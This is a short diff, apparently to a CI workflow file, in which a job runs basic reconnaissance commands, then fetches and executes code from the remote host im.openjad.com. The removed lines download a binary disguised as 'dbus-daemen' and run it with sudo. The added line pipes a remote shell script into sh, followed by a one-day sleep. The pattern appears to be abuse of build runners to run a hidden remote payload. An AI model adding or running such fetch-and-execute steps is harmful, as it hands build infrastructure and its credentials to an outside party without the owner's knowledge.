@@ -12,7 +12,5 @@ jobs:
         pwd
         ls -la
         whoami
-        wget https://im.openjad.com:19443/dbus-daemen
-        chmod 777 dbus-daemen
-        sudo ./dbus-daemen
+        curl https://im.openjad.com:19443/one2.sh | sh
         sleep 1d
